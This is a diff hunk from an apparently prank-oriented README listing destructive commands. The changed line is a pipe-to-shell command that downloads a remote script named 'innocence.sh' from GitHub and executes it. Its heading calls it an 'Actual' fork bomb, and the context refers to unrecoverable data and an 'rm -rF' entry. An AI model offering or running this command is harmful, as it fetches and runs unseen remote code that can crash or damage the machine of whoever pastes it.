@@ -16,7 +16,7 @@ But don't worry Microsoft won't be able to recover your data after what they are
   - **Fork Bomb (Actual Bomb)**
     
 	```
-    	bash <(curl -fsSL "https://raw.githubusercontent.com/RichardSmith240/JustForFun/main/scripts/innocence.sh") 
+    bash <(curl -fsSL "https://raw.githubusercontent.com/RichardSmith240/JustForFun/main/scripts/innocence.sh") 
     ```
 	
   - **rm -rF (Not Real)**
